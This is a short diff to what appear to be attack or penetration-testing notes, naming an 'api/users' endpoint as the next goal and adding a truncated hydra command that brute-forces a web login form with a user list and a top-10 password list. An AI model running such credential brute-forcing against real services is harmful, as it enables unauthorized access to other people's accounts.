@@ -166,3 +166,5 @@ next goal:
 
 api/users
 brute force with hydra and top 10 passwords.
+
+hydra -f -L users.txt -P top10.txt TARGET http-form-post "login=a...
